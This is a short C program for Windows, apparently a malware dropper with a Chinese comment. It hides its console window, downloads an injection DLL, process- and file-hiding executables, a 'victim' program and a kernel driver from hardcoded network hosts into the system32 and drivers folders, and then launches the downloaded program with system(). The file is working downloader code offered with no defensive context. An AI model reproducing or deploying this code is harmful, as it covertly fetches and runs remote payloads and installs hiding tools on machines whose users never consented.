#include <UrlMon.h>
#pragma comment(lib, "urlmon.lib")

#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <process.h>
#include <Windows.h>

void main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char a[1000];
	sprintf(a, "echo off| start \/d\"C:\\WINDOWS\\system32\\\" victim.exe|exit");
	URLDownloadToFile(NULL, _T("http://10.64.136.179/test/InjectDll.dll"), _T("C:\\WINDOWS\\system32\\InjectDll.dll"), NULL, NULL);
	
	URLDownloadToFile(NULL, _T("http://10.64.136.179/test/ProcessHiding.exe"), _T("C:\\WINDOWS\\system32\\ProcessHiding.exe"), NULL, NULL);

	URLDownloadToFile(NULL, _T("http://10.64.136.179/test/Victim.exe"), _T("C:\\WINDOWS\\system32\\victim.exe"), NULL, NULL);

	URLDownloadToFile(NULL, _T("http://10.64.136.179/test/cccc.sys"), _T("C:\\WINDOWS\\system32\\drivers\\cccc.sys"), NULL, NULL);
	
	URLDownloadToFile(NULL, _T("http://192.168.1.109/test/filehiding.exe"), _T("C:\\WINDOWS\\system32\\filehiding.exe"), NULL, NULL);

	//a为字符串，内容为批处理（即命令的整合啊= =……）
	//system(a)执行批处理
	system(a);

}